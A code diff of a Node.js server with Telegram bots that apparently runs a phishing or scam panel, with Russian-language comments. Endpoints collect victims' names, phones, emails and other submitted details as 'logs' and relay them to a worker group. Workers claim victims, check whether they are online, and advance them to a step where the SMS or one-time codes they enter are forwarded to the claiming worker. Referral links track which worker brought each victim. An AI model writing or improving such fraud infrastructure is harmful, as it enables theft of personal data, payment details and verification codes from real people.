@@ -3,6 +3,14 @@ const TelegramBot = require("node-telegram-bot-api");
 
 const app = express();
 
+// ===== АНТИКРАШ =====
+process.on("unhandledRejection", (err) => {
+  console.log("❌ UNHANDLED:", err?.message);
+});
+process.on("uncaughtException", (err) => {
+  console.log("❌ CRASH:", err?.message);
+});
+
 app.use(express.json({ limit: "1mb" }));
 app.use((req, res, next) => {
   res.header("Access-Control-Allow-Origin", "*");
@@ -15,36 +23,107 @@ const workerBot = new TelegramBot(process.env.WORKER_BOT_TOKEN, {
   polling: true
 });
 
-const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN); // БЕЗ polling
+const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN);
 
 // ===== ENV =====
 const adminId = Number(process.env.ADMIN_CHAT_ID);
 const workerChat = Number(process.env.WORKER_CHAT_ID);
+const SITE_URL = process.env.SITE_URL; // 🔥 добавь в railway
+
+// ===== SAFE =====
+async function safeSend(bot, chatId, text, opts = {}) {
+  try { return await bot.sendMessage(chatId, text, opts); }
+  catch (e) { console.log("send error:", e?.message); return null; }
+}
+async function safeEdit(bot, chatId, msgId, text, opts = {}) {
+  try {
+    return await bot.editMessageText(text, {
+      chat_id: chatId,
+      message_id: msgId,
+      ...opts
+    });
+  } catch (e) { console.log("edit error:", e?.message); }
+}
+async function safeDelete(bot, chatId, msgId) {
+  try { await bot.deleteMessage(chatId, msgId); }
+  catch (e) {}
+}
 
 // ===== БАЗЫ =====
+let moderators = [];
+let usersByUsername = {};
+let userRefs = {}; // 🔥 кто привёл
+
 let takenRequests = {};
 let fullRequests = {};
 let shortRequests = {};
+let groupMessages = {};
+let fullMessages = {};
+
 let seenUsers = {};
 let onlineUsers = {};
 let bannedUsers = {};
 let userStatus = {};
-let requestOwner = {}; // 🔥 кто привёл
+let extraSentUsers = {};
 
 // ===== ONLINE =====
 function isOnline(id) {
-  if (!onlineUsers[id]) return false;
-  return Date.now() - onlineUsers[id] < 20000;
+  return onlineUsers[id] && Date.now() - onlineUsers[id] < 20000;
 }
 
+// ===== /START =====
+workerBot.onText(/\/start/, (msg) => {
+  const username = msg.from.username;
+  const id = msg.chat.id;
+
+  if (!username) {
+    return safeSend(workerBot, id, "❌ Поставь username в Telegram");
+  }
+
+  usersByUsername[username.toLowerCase()] = id;
+
+  const link = `${SITE_URL}?ref=${username}`;
+
+  safeSend(workerBot, id,
+`✅ Ты зарегистрирован
+
+🔗 Твоя ссылка:
+${link}
+
+👥 Делись ей и получай клиентов`
+  );
+});
+
+// ===== ПРОВЕРКА МОДЕРА =====
+function isMod(id) {
+  return id === adminId || moderators.includes(id);
+}
+
+// ===== МОДЕРЫ =====
+workerBot.onText(/\/addmod @(.+)/, (msg, match) => {
+  if (msg.chat.id !== adminId) return;
+
+  const username = match[1].toLowerCase();
+  const id = usersByUsername[username];
+
+  if (!id) return safeSend(workerBot, adminId, "❌ Он не писал боту");
+
+  if (!moderators.includes(id)) moderators.push(id);
+
+  safeSend(workerBot, adminId, `✅ Добавлен: @${username}`);
+});
+
 // ===== ВХОД =====
-app.post("/enter", (req, res) => {
-  const id = req.body.clientId;
-  if (!id) return res.json({ ok: false });
+app.post("/enter", async (req, res) => {
+  const { clientId, ref } = req.body;
 
-  onlineUsers[id] = Date.now();
+  if (!clientId) return res.json({ ok: false });
 
-  enterBot.sendMessage(adminId, `👀Переход по ссылке!\n🆔 ${id}`).catch(()=>{});
+  onlineUsers[clientId] = Date.now();
+
+  if (ref) userRefs[clientId] = ref;
+
+  await safeSend(enterBot, adminId, `👀 Вход\n🆔 ${clientId}`);
 
   res.json({ ok: true });
 });
@@ -57,58 +136,61 @@ app.post("/ping", (req, res) => {
 });
 
 // ===== ЗАЯВКА =====
-app.post("/send", (req, res) => {
-  try {
-    const d = req.body;
-    const id = d.clientId;
+app.post("/send", async (req, res) => {
+  const d = req.body;
+  const id = d.clientId;
 
-    if (!id) return res.json({ ok: false });
-    if (bannedUsers[id]) return res.json({ ok: false });
+  if (!id) return res.json({ ok: false });
+  if (bannedUsers[id]) return res.json({ ok: false });
 
-    const isRepeat = seenUsers[id];
-    seenUsers[id] = true;
+  delete takenRequests[id];
+  delete extraSentUsers[id];
 
-    const statusText = isRepeat ? "Повторный Лог♻️" : "🔥 Новый Лог 👻";
+  const isRepeat = seenUsers[id];
+  seenUsers[id] = true;
 
-    const moderator = d.refUser || "неизвестно";
+  const statusText = isRepeat ? "🔁 ПОВТОРНАЯ" : "🆕 НОВАЯ";
 
-    const fullText = `${statusText} Лог
+  const refUser = userRefs[id]
+    ? `👤 Привёл: @${userRefs[id]}`
+    : "👤 Привёл: неизвестно";
+
+  const fullText = `${statusText}
 
 🆔 ${id}
+📦 ${d.service}
+👤 ${d.name}
+📞 ${d.phone}
+📅 ${d.email}
+${d.city}
+${d.comment}
 
-🏧 ${d.service}
-🗝️ ${d.name}
-📱 ${d.phone}
-📆 ${d.email}
-⛓️‍💥 ${d.city}
-💳 ${d.comment}
+${refUser}`;
 
-: ${moderator}`;
-
-    const shortText = `${statusText}
+  const shortText = `${statusText}
 
 📦 ${d.service}
-📱 ${d.phone}
+👤 ${d.name}
+📞 ${d.phone}
 
- ${moderator}`;
+${refUser}`;
 
-    fullRequests[id] = fullText;
-    shortRequests[id] = shortText;
-    requestOwner[id] = moderator;
+  fullRequests[id] = fullText;
+  shortRequests[id] = shortText;
 
-    workerBot.sendMessage(workerChat, shortText, {
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "📥 Забрать", callback_data: "take_" + id }]
-        ]
-      }
-    }).catch(()=>{});
+  const msg = await safeSend(workerBot, workerChat, shortText, {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "📥 Забрать", callback_data: "take_" + id }]
+      ]
+    }
+  });
 
-    res.json({ ok: true });
+  if (msg) groupMessages[id] = msg.message_id;
 
-  } catch (e) {
-    res.json({ ok: false });
-  }
+  userStatus[id] = "wait";
+
+  res.json({ ok: true, id });
 });
 
 // ===== СТАТУС =====
@@ -116,145 +198,98 @@ app.get("/status/:id", (req, res) => {
   res.json({ status: userStatus[req.params.id] || "wait" });
 });
 
-// ===== ДОП ДАННЫЕ =====
-app.post("/send2", (req, res) => {
-  try {
-    const id = req.body.id;
-    const value = req.body.value;
+// ===== ДОП =====
+app.post("/send2", async (req, res) => {
+  const { id, value } = req.body;
 
-    if (!id || !value) return res.json({ ok: false });
+  if (!id || !value) return res.json({ ok: false });
 
-    const owner = takenRequests[id];
+  if (extraSentUsers[id]) return res.json({ ok: false });
 
-    if (!owner) return res.json({ ok: true });
+  extraSentUsers[id] = true;
 
-    workerBot.sendMessage(owner, `📩 SMS/CODE\n\n${value}`).catch(()=>{});
+  const owner = takenRequests[id];
 
-    res.json({ ok: true });
-
-  } catch {
-    res.json({ ok: false });
+  if (owner) {
+    await safeSend(workerBot, owner, `📩 ДОП\n🆔 ${id}\n💬 ${value}`);
   }
+
+  res.json({ ok: true });
 });
 
 // ===== CALLBACK =====
 workerBot.on("callback_query", async (q) => {
-  try {
-    const data = q.data;
-    const id = data.split("_")[1];
+  const data = q.data;
+  const id = data.split("_")[1];
 
-    // ===== ЗАБРАТЬ =====
-    if (data.startsWith("take")) {
+  if (!isMod(q.from.id)) {
+    return workerBot.answerCallbackQuery(q.id, { text: "❌ Нет доступа" });
+  }
 
-      if (takenRequests[id]) {
-        return workerBot.answerCallbackQuery(q.id, {
-          text: "❌ Уже занято"
-        });
+  if (data.startsWith("take")) {
+
+    if (takenRequests[id]) {
+      return workerBot.answerCallbackQuery(q.id, { text: "❌ Уже занято" });
+    }
+
+    takenRequests[id] = q.from.id;
+
+    const username = q.from.username
+      ? "@" + q.from.username
+      : q.from.first_name;
+
+    const sent = await safeSend(workerBot, q.from.id, fullRequests[id], {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
+          [
+            { text: "🚫 Бан", callback_data: "ban_" + id },
+            { text: "✅ Разбан", callback_data: "unban_" + id }
+          ],
+          [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
+        ]
       }
+    });
 
-      takenRequests[id] = q.from.id;
+    if (sent) fullMessages[id] = sent.message_id;
 
-      const username = q.from.username
-        ? "@" + q.from.username
-        : q.from.first_name;
+    await safeEdit(workerBot, workerChat, groupMessages[id],
+`${shortRequests[id]}
 
-      // меняем сообщение в чате
-      await workerBot.editMessageText(
-        shortRequests[id] + `\n\n Взял: ${username}`,
-        {
-          chat_id: q.message.chat.id,
-          message_id: q.message.message_id,
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: "🔓 Отпустить", callback_data: "release_" + id }]
-            ]
-          }
-        }
-      );
-
-      // отправляем в личку
-      workerBot.sendMessage(q.from.id, fullRequests[id], {
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
-            [
-              { text: "🚫 Бан", callback_data: "ban_" + id },
-              { text: "✅ Разбан", callback_data: "unban_" + id }
-            ],
-            [{ text: "➡️ SMS/CODE", callback_data: "allow_" + id }]
-          ]
-        }
-      }).catch(()=>{});
-
-      workerBot.answerCallbackQuery(q.id);
-    }
-
-    // ===== ОТПУСТИТЬ =====
-    if (data.startsWith("release")) {
-
-      if (takenRequests[id] !== q.from.id) {
-        return workerBot.answerCallbackQuery(q.id, {
-          text: "❌ Не твой"
-        });
+👤 Взял: ${username}`, {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "🔓 Освободить", callback_data: "free_" + id }]
+        ]
       }
+    });
 
-      delete takenRequests[id];
+    workerBot.answerCallbackQuery(q.id);
+  }
 
-      await workerBot.editMessageText(
-        shortRequests[id],
-        {
-          chat_id: q.message.chat.id,
-          message_id: q.message.message_id,
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: "📥 Забрать", callback_data: "take_" + id }]
-            ]
-          }
-        }
-      );
+  if (data.startsWith("free")) {
+    delete takenRequests[id];
 
-      workerBot.answerCallbackQuery(q.id, {
-        text: "✅ Освобождено"
-      });
-    }
+    await safeDelete(workerBot, q.from.id, fullMessages[id]);
 
-    // ===== ОНЛАЙН =====
-    if (data.startsWith("check")) {
-      workerBot.answerCallbackQuery(q.id, {
-        text: isOnline(id) ? "🟢 Онлайн" : "🔴 Оффлайн"
-      });
-    }
+    await safeEdit(workerBot, workerChat, groupMessages[id],
+      shortRequests[id], {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "📥 Забрать", callback_data: "take_" + id }]
+        ]
+      }
+    });
 
-    // ===== БАН =====
-    if (data.startsWith("ban")) {
-      bannedUsers[id] = true;
-      workerBot.answerCallbackQuery(q.id);
-    }
+    workerBot.answerCallbackQuery(q.id);
+  }
 
-    // ===== РАЗБАН =====
-    if (data.startsWith("unban")) {
-      delete bannedUsers[id];
-      workerBot.answerCallbackQuery(q.id);
-    }
-
-    // ===== ДАЛЬШЕ =====
-    if (data.startsWith("allow")) {
-      userStatus[id] = "next";
-      workerBot.answerCallbackQuery(q.id, {
-        text: "➡️ SMS/CODE"
-      });
-    }
-
-  } catch (e) {
-    console.log("ERR:", e.message);
+  if (data.startsWith("allow")) {
+    userStatus[id] = "next";
+    workerBot.answerCallbackQuery(q.id);
   }
 });
 
-// ===== АНТИКРАШ =====
-process.on("uncaughtException", (e) => console.log("CRASH:", e));
-process.on("unhandledRejection", (e) => console.log("REJECT:", e));
-
-// ===== СТАРТ =====
 app.listen(process.env.PORT || 3000, () => {
   console.log("SERVER OK");
 });
